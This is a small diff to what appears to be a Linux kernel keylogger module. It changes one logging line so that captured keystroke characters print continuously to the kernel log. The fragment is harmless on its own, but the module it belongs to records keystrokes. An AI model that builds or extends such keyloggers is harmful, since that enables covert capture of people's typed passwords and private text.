@@ -410,7 +410,7 @@ static void	key_logprint_smart(struct key_log_entry *log, void *ptr)
 		return;
 	ascii = (log->upper_case) ? log->key->ascii_up : log->key->ascii;
 	if (isprint(ascii) || log->key->ascii == '\n')
-		pr_info("%c", ascii);
+		pr_info(KERN_CONT "%c", ascii);
 }
 
 static void		__exit keylogger_clean(void)
